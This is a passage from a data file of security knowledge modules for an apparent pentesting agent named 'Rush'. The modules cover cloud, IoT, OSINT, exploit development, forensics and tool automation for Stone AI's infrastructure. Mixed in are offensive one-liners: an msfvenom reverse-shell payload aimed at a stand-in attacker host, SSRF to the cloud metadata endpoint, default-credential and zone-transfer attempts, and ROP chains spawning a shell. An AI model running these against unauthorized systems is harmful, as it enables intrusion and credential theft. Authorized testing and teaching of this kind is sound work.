- AppArmor/SELinux: Mandatory access control for containers. Check if enabled: docker inspect --format='{{.HostConfig.SecurityOpt}}' <container>.
- Read-only filesystem: docker run --read-only prevents writes to container filesystem. Combine with tmpfs mounts for necessary write paths.
- No-new-privileges: docker run --security-opt=no-new-privileges prevents SUID-based escalation inside container.

Network Security:
- Default bridge network: All containers on default bridge can communicate. Use custom networks for isolation: docker network create --internal isolated-net.
- Inter-container traffic: docker network inspect bridge — check which containers share networks.
- Published ports: docker port <container> — verify only necessary ports are published, and to 127.0.0.1, not 0.0.0.0.

Docker Compose Security:
Review compose files for: privileged mode, host network mode, excessive volume mounts, environment variables with secrets (use Docker secrets instead), missing health checks, images without version pinning (:latest tag).`
    },
    {
      title: "R-15: Cloud Security Assessment",
      content: `Cloud security testing covers Stone AI's cloud infrastructure — Vercel (deployment), Neon (PostgreSQL), Cloudflare (DNS/CDN/tunnels), and Clerk/Stripe (auth/payments).

Vercel Security:
- Environment variables: Verify sensitive vars (API keys, database URLs) are scoped to correct environments (production/preview/development). Check for leaked env vars in client-side bundles — search build output for key patterns.
- Deployment protection: Verify preview deployments require authentication. Public preview URLs can leak pre-release features and test data.
- Serverless function security: Check function timeout limits, memory limits, and cold start behavior. Test for function-level DoS.
- Build logs: Ensure build logs don't contain sensitive information. Logs may be visible to team members with lower access.

Neon (PostgreSQL) Security:
- Connection strings: Use connection pooling endpoints (port 5432 via PgBouncer). Verify SSL is enforced (sslmode=require in connection string).
- Branching: Neon branches share the same data — test that branch isolation is properly configured for dev/staging.
- IP allowlisting: If available, restrict database access to Vercel's IP ranges and the OMEN's public IP.
- Roles: Verify application uses a limited-privilege role, not the owner role. Test if the app role can DROP tables or access other databases.

Cloudflare Security:
- Tunnel security: The omen-vllm tunnel (llm.stone-ai.net) exposes vLLM. Verify: API key required on all /v1/ endpoints, rate limiting via nginx (10 req/s), no direct IP exposure.
- DNS: Check for subdomain takeover — do any DNS records point to deprovisioned services? dig all subdomains and verify targets respond.
- WAF rules: Configure Cloudflare WAF for stone-ai.net. Block common attack patterns, SQL injection, XSS in URL parameters.
- SSL: Verify Full (Strict) SSL mode — Cloudflare to origin encryption with valid certificate. Check for mixed content.
- Page rules and redirects: Verify HTTP to HTTPS redirect. Check for open redirects in application.

AWS/Azure/GCP (General Cloud):
- S3/Blob storage: aws s3 ls s3://bucket-name --no-sign-request — test for public buckets. Tools: cloud_enum, S3Scanner, BucketFinder.
- IAM: Principle of least privilege. Check for overly permissive policies, wildcard permissions, unused credentials.
- Metadata service: SSRF to http://169.254.169.254/latest/meta-data/ — can the application reach the cloud metadata endpoint? If so, IAM credentials, instance identity, and user data are exposed.
- CloudTrail/Activity Logs: Verify logging is enabled and not tamperable. Test alert response to suspicious API calls.

Stripe Security:
- Webhook validation: Verify stripe.webhooks.constructEvent() validates signatures. Test with replayed/modified payloads.
- Test vs live keys: Ensure test keys (sk_test_) never appear in production. Search codebase and build outputs.
- PCI compliance: Stone AI uses Stripe Elements/Checkout — card data never touches our servers. Verify this remains true (SAQ A eligibility).`
    },
    {
      title: "R-16: IoT & Embedded Device Security",
      content: `IoT security testing covers smart home devices, network equipment (routers, switches, APs), printers, and any embedded systems on the OMEN network.

Device Discovery:
Scan the network for IoT devices: nmap -sn 192.168.1.0/24 then fingerprint with nmap -sV -O <target>. IoT devices often have distinctive signatures — UPnP responses, mDNS announcements, SSDP broadcasts. Use nmap --script broadcast-upnp-info to discover UPnP-enabled devices.

Default Credential Testing:
Most IoT devices ship with default credentials. Check databases: creds (github.com/ihebski/DefaultCreds-cheat-sheet), Shodan default password database, manufacturer documentation. Common defaults: admin/admin, admin/password, root/root, admin/1234. Test web interfaces, SSH, Telnet, SNMP community strings (public/private).

Firmware Analysis:
Extract firmware: download from manufacturer, dump via UART/JTAG, or intercept OTA updates.
- binwalk -e firmware.bin — extract embedded filesystems, compressed archives, certificates.
- firmwalker — search extracted filesystem for passwords, keys, URLs, interesting files.
- firmware-mod-kit — unpack, modify, repack firmware images.
- Look for: hardcoded credentials, API keys, debug interfaces, outdated libraries (busybox, OpenSSL, lighttpd).

Hardware Interfaces:
- UART: Connect via USB-to-serial adapter. Common baud rate: 115200. Provides serial console access — often drops to root shell without authentication. Identify TX/RX/GND pins with multimeter or logic analyzer.
- JTAG: Debug interface for direct CPU access. Read/write flash, dump memory, debug running code. Tools: OpenOCD, JTAGulator (pin identification).
- SPI/I2C: Bus interfaces for flash chips. Read firmware directly from SPI flash with flashrom or spiflash.py.

Protocol Fuzzing:
IoT devices often implement protocols poorly. Fuzz:
- MQTT: mqtt-fuzz, or custom Python scripts using paho-mqtt. Test for: unauthenticated access, topic injection, message flooding.
- CoAP: Constrained Application Protocol — test with aiocoap. Check for unauthenticated resource access.
- Zigbee/Z-Wave: Software-defined radio (HackRF, RTL-SDR) for wireless protocol analysis. Decode and replay commands.
- BLE: btlejack for sniffing, gatttool for interaction. Test for: unauthenticated pairing, unencrypted communication.

Router/AP Testing:
- Web interface: Default creds, command injection in diagnostic tools (ping, traceroute fields), firmware update CSRF.
- UPnP: upnpc -l — list port mappings. UPnP allows unauthenticated port forwarding changes.
- DNS rebinding: Test if router web interface is accessible via DNS rebinding from external websites.
- SNMP: snmpwalk -v2c -c public <router_ip> — community string "public" often works. Reveals device info, routing tables, interface stats.`
    },
    {
      title: "R-17: Reporting & Documentation",
      content: `Reporting transforms technical findings into actionable intelligence. Rush produces clear, prioritized pentest reports that drive remediation — not just vulnerability dumps.

Pentest Report Structure:
1. Executive Summary (1-2 pages): High-level findings, overall risk assessment, critical recommendations. Written for non-technical stakeholders. No jargon. Focus on business impact.
2. Scope & Methodology: What was tested, what wasn't, testing period, tools used, approach (black/gray/white box), rules of engagement.
3. Findings Summary: Table of all findings sorted by severity. Columns: ID, Title, Severity (Critical/High/Medium/Low/Info), CVSS Score, Status, Affected Asset.
4. Detailed Findings: Each finding gets its own section with title and severity, affected asset(s) and endpoint(s), description, proof of concept (exact steps to reproduce with screenshots), impact, remediation (specific fix, not generic advice), and references (CVE, CWE, OWASP mapping).
5. Appendices: Full tool output, scan results, methodology details.

Evidence Collection:
- Screenshots: Capture every exploitation step. Use timestamps. Include request/response pairs from Burp Suite.
- Terminal output: Record commands and output. Use script command for terminal session recording: script -a pentest-session.log.
- Network captures: Save relevant pcap files. Filter to only include attack-related traffic.
- Video: For complex multi-step attacks, screen recording provides unambiguous evidence.

CVSS v3.1 Scoring:
Calculate scores accurately — they determine remediation priority.
- Critical (9.0-10.0): Unauthenticated RCE, full database exposure, admin access without auth
- High (7.0-8.9): Authenticated RCE, privilege escalation, significant data exposure
- Medium (4.0-6.9): XSS, CSRF, information disclosure, missing security headers
- Low (0.1-3.9): Verbose error messages, minor info leaks, theoretical attacks
- Informational (0.0): Best practice recommendations, defense-in-depth suggestions

Risk Rating Context:
CVSS alone doesn't tell the full story. A CVSS 7.0 SQL injection on a public-facing login page is more urgent than a CVSS 9.0 kernel exploit requiring physical access. Add contextual risk rating: Likelihood (exploitability in context) x Impact (to this specific business) = Contextual Risk.

Remediation Guidance:
Don't just say "patch it." Provide: immediate mitigation (what to do now — WAF rule, IP block, disable feature), long-term fix (code change, architecture modification, vendor patch), verification steps (how to confirm the fix works), and timeline recommendation (Critical: 24-48 hours, High: 1 week, Medium: 1 month, Low: next release).

Retesting Protocol:
After remediation, retest each finding. Document: original finding, remediation applied, retest date, retest result (fixed/partially fixed/not fixed), evidence of fix.`
    },
    {
      title: "R-18: OSINT & Information Gathering",
      content: `Open Source Intelligence gathering is the pre-engagement phase — collecting publicly available information about the target before any active scanning. Rush uses OSINT to understand attack surface and identify potential entry points.

Search Engine Dorking:
Google dorks for reconnaissance:
- site:stone-ai.net — all indexed pages
- site:stone-ai.net filetype:pdf — exposed documents
- site:stone-ai.net inurl:admin — admin panels
- site:stone-ai.net intitle:"index of" — directory listings
- "stone-ai.net" -site:stone-ai.net — mentions on other sites
- site:github.com "stone-ai" — code/mentions on GitHub
- site:pastebin.com "stone-ai" — paste sites for leaked data

Subdomain Enumeration:
Multiple tools for completeness:
- subfinder -d stone-ai.net -all — passive subdomain discovery from certificate transparency logs, DNS datasets, web archives.
- amass enum -d stone-ai.net — comprehensive enumeration combining passive and active techniques.
- assetfinder --subs-only stone-ai.net — fast, passive-only.
- Certificate Transparency: curl -s "https://crt.sh/?q=%25.stone-ai.net&output=json" | jq -r '.[].name_value' | sort -u
- After discovery, resolve all subdomains and check for subdomain takeover: subjack -w subdomains.txt -t 100 -timeout 30 -ssl

Shodan & Censys:
- Shodan: shodan search "stone-ai", shodan host <ip> — find internet-exposed services, banners, technologies, vulnerabilities. Shodan indexes banners from port scans across the internet.
- Censys: censys search "stone-ai.net" — similar to Shodan with stronger TLS certificate analysis. Find all certificates issued to the domain.
- Both tools reveal exposed services you might not know about — development servers, forgotten test instances, misconfigured cloud resources.

theHarvester:
theHarvester -d stone-ai.net -b all — collects emails, names, subdomains, IPs, and URLs from public sources (Google, Bing, LinkedIn, DNSdumpster, etc.). Emails become targets for phishing and credential stuffing.

DNS Reconnaissance:
- Record enumeration: dig any stone-ai.net, check A, AAAA, MX, TXT, NS, CNAME, SOA records.
- SPF record: dig txt stone-ai.net — identify authorized email senders. Weak SPF (~all vs -all) allows email spoofing.
- DMARC: dig txt _dmarc.stone-ai.net — check enforcement policy (none/quarantine/reject).
- Zone transfer: dig axfr @<nameserver> stone-ai.net — if misconfigured, dumps entire zone file.
- DNS history: SecurityTrails, DNSHistory — find old IP addresses, previous hosting providers, historical records.

GitHub & Code Leaks:
- Search GitHub: "stone-ai" password, "stone-ai" api_key, "stone-ai" secret. Check not just code but issues, commits, and gists.
- TruffleHog: trufflehog git https://github.com/org/repo — scans entire git history for high-entropy strings (API keys, passwords).
- GitLeaks: gitleaks detect --source=/path/to/repo — comprehensive secret scanning with regex patterns.

Social Media & People:
LinkedIn for employee enumeration, Twitter/X for tech stack mentions, job postings for technology clues (e.g., "Experience with PostgreSQL and Redis required" reveals stack).

Wayback Machine:
wayback_machine_downloader stone-ai.net or use the Wayback CDX API. Find old pages, removed content, previous versions of JavaScript (may contain old API endpoints), robots.txt history (reveals hidden paths).`
    },
    {
      title: "R-19: Exploit Development Fundamentals",
      content: `Exploit development is the art of turning vulnerabilities into working exploits. Rush understands the fundamentals — buffer overflows, shellcode, and PoC development — for authorized testing and vulnerability validation.

Memory Corruption Basics:
- Stack buffer overflow: When a function writes beyond a stack buffer's boundary, it overwrites the saved return pointer. Control the return address = control execution flow. Classic example: strcpy(buffer, user_input) where buffer is 64 bytes but input is 200.
- Heap overflow: Overwrite heap metadata (chunk headers) to corrupt the memory allocator. Harder to exploit but achievable on older allocators. Techniques: House of Force, fastbin corruption, tcache poisoning.
- Use-After-Free: Access memory after it's been freed. If the freed region is reallocated with attacker-controlled data, the original reference now points to attacker data. Common in browsers and complex C/C++ applications.
- Format string: printf(user_input) instead of printf("%s", user_input). Attacker uses %x to read stack, %n to write memory. Enables arbitrary read/write.

Exploitation Mitigations & Bypasses:
- ASLR (Address Space Layout Randomization): Randomizes memory layout on each run. Bypass: information leak to discover base addresses, brute force (32-bit systems), partial overwrite (only change lower bytes).
- DEP/NX (No-Execute): Marks stack/heap as non-executable. Bypass: Return-Oriented Programming (ROP) — chain existing executable code snippets (gadgets) to perform arbitrary operations.
- Stack Canaries: Random value before saved return pointer; checked before function return. Bypass: information leak to read canary, overwrite canary with correct value, skip canary with format string write.
- PIE (Position Independent Executable): Code segment also randomized. Bypass: leak a code pointer to calculate base address.

ROP Chains:
ROP chains use gadgets — short instruction sequences ending in ret found in existing code. Tools: ROPgadget --binary target-binary | grep "pop rdi", ropper -f target-binary. Build chain to: set registers to desired values, call system("/bin/sh") or execve, or call mprotect to make memory executable then jump to shellcode.

Shellcode Development:
Write shellcode in assembly, assemble with nasm, extract bytes. Simple Linux x64 execve("/bin/sh") shellcode is approximately 27 bytes. Constraints: avoid null bytes (breaks string functions), avoid specific characters, stay within size limits. Use msfvenom for quick generation: msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f python -b '\\x00'.

Fuzzing:
Find vulnerabilities automatically by feeding malformed input.
- AFL++: afl-fuzz -i input-corpus -o findings -- ./target @@ — coverage-guided fuzzer. Instruments the binary to track code paths and prioritize inputs that explore new paths.
- Boofuzz: Network protocol fuzzer. Define protocol structure, fuzz each field. s_string("GET", fuzzable=False); s_delim(" "); s_string("/", fuzzable=True).
- LibFuzzer: In-process fuzzer for libraries. Write a harness function, compile with sanitizers, let it run.

PoC Development Best Practices:
- Write clean, commented PoC code with clear exploit/non-exploit modes.
- Include a safety check — verify the target is actually vulnerable before exploiting.
- Document: vulnerability type, affected versions, prerequisites, impact, remediation.
- Use Python with pwntools for exploit development: from pwn import *; p = process('./vuln'); p.sendline(payload).`
    },
    {
      title: "R-20: Incident Response & Forensics",
      content: `Incident response and digital forensics skills enable Rush to both simulate breaches and analyze the aftermath. Understanding IR helps design better tests and validates detection capabilities.

Incident Response Phases (NIST SP 800-61):
1. Preparation: IR plan, team roles, communication channels, tools ready, baselines established.
2. Detection & Analysis: Alert triage, log analysis, indicator identification, scope determination.
3. Containment: Short-term (isolate host, block IP) and long-term (patch, rebuild, credential reset).
4. Eradication: Remove malware, close access vectors, patch vulnerabilities.
5. Recovery: Restore from clean backups, monitor for re-compromise, gradual reconnection.
6. Lessons Learned: Post-incident report, process improvements, detection gap analysis.

Log Analysis:
- Windows Event Logs: Security log (4624=logon, 4625=failed logon, 4672=special privileges, 4688=process creation, 4698=scheduled task created). Use wevtutil or PowerShell Get-WinEvent.
- Linux logs: /var/log/auth.log (authentication), /var/log/syslog (system), /var/log/apache2/access.log (web), journalctl for systemd.
- Application logs: Check Historian (port 7337) for Claude Code telemetry, vLLM logs at /tmp/vllm.log, Docker container logs.
- Timeline correlation: log2timeline.py (Plaso) creates super timelines from multiple log sources. Sort by timestamp to reconstruct attacker actions.

Memory Forensics:
- Acquire memory: winpmem.exe memdump.raw (Windows), LiME (Linux kernel module for memory acquisition).
- Volatility 3 analysis: vol.py -f memdump.raw windows.pslist (process list), windows.netscan (network connections), windows.cmdline (command history), windows.malfind (injected code), windows.hashdump (password hashes), windows.filescan (file handles).
- Look for: hidden processes, injected DLLs, hollowed processes, network connections to C2, command history, cached credentials.

Disk Forensics:
- Imaging: dd if=/dev/sda of=disk.img bs=4M status=progress or FTK Imager for Windows. Always work on a copy, never the original.
- File system analysis: Autopsy (GUI) or Sleuth Kit (CLI) — fls -r -m / disk.img to list all files including deleted.
- Timeline: mactime -b bodyfile.txt -d — create timeline from MAC timestamps.
- Artifacts: Browser history, prefetch files (Windows), shellbags, recent files, USB device history, MFT analysis.

Chain of Custody:
Document: who collected the evidence, when, where, how, hash values (SHA-256) of all images and evidence files, storage location, access log. Maintain integrity throughout — any gap breaks the chain.

Network Forensics:
- Packet capture analysis: tcpdump -r capture.pcap or Wireshark. Filter for suspicious traffic: unusual protocols, high-volume transfers (exfil), beaconing patterns (C2), DNS tunneling (large TXT responses, high query volume).
- NetFlow analysis: Even without full packet capture, flow data (source/dest IP, ports, bytes, duration) reveals communication patterns.
- PCAP carving: Extract files from packet captures with tcpflow or Wireshark's "Export Objects" feature.

Detection Validation:
After offensive testing, verify detection: Did SIEM alert on the attack? Did EDR catch the payload? Did the IR team respond appropriately? Document detection gaps and recommend improvements. This is the bridge between red team (Rush) and blue team operations.`
    },
    {
      title: "R-21: Security Tool Automation & Scripting",
      content: `Automation scales security testing from manual one-offs to repeatable, comprehensive assessments. Rush builds custom tools, integrates scanners into CI/CD, and automates routine security checks.

Python for Security:
Python is the primary language for security automation. Key libraries:
- requests / httpx: HTTP requests with session handling, proxy support, certificate pinning bypass. httpx supports async for concurrent scanning.
- scapy: Packet crafting and analysis. Build custom packets, sniff traffic, implement protocol-level attacks. send(IP(dst="target")/TCP(dport=80,flags="S")) — send SYN packet.
- paramiko: SSH automation. Connect to hosts, execute commands, transfer files programmatically.
- pwntools: Exploit development framework. Process interaction, ROP chain building, shellcode generation, ELF parsing.
- beautifulsoup4 / lxml: Web scraping for OSINT and crawling.
- impacket: Windows protocol implementation in Python. SMB, MSRPC, Kerberos, LDAP. The backbone of many AD attack tools.

Bash for Security:
Quick automation for reconnaissance and scanning. Example network sweep script: discover live hosts with nmap -sn, extract IPs with grep/awk, run full service scan with nmap -sV -sC -p- against live hosts, save all results to timestamped directory.

Custom Scanner Development:
Build targeted scanners for Stone AI-specific checks:
- Tier access validator: Script that authenticates as each tier level and attempts to access every agent endpoint. Verify FREE can't access SMART agents.
- Header checker: Verify security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options) across all routes.
- Auth bypass tester: Remove auth headers, use expired tokens, try each endpoint. Log any that return 200.
- Rate limit tester: Hit endpoints at increasing rates, verify throttling kicks in at configured thresholds.

CI/CD Security Integration:
Shift security left by integrating into the build pipeline:
- Pre-commit hooks: gitleaks protect --staged — block commits containing secrets.
- Build step: npm audit --audit-level=high — fail build on high-severity dependency vulnerabilities.
- SAST (Static Analysis): Semgrep rules for Next.js/TypeScript: semgrep --config=p/nextjs --config=p/typescript . — catches SQL injection, XSS, insecure crypto, and framework-specific issues.
- DAST: Run Nuclei or ZAP against staging deployment before promoting to production.
- Container scanning: trivy image stone-ai:latest before pushing to registry.

Automation Frameworks:
- Ansible for security: Automate security hardening across multiple hosts. Playbooks for: CIS benchmark compliance, firewall rules, service configuration, patch management.
- Terraform security: tfsec or checkov scan IaC for misconfigurations before deployment.
- Custom dashboards: Aggregate scan results into a central dashboard. Parse Nuclei JSON output, nmap XML, and npm audit JSON into a unified view.

Scheduled Security Checks:
Automate recurring assessments:
- Daily: Certificate expiry checks, dependency vulnerability scan, endpoint availability.
- Weekly: Full Nuclei scan against web endpoints, Docker image scan, log review for anomalies.
- Monthly: Comprehensive nmap scan of infrastructure, cloud configuration audit, access review.
- Store results historically to track security posture over time. Alert on regressions — a previously-fixed vulnerability reappearing.

Tool Orchestration:
Chain tools together for comprehensive automation: subfinder discovers subdomains, httpx probes for live web servers, nuclei scans each live server, results parsed and deduplicated, new findings compared against previous scan, delta report generated and sent via alert system. Pipeline: subfinder -d stone-ai.net -silent | httpx -silent | nuclei -t cves/ -o results.json -json. Integrate with the Chaos alert system (nodemailer + Gmail SMTP) to notify on critical findings.`
    }
  ]
};
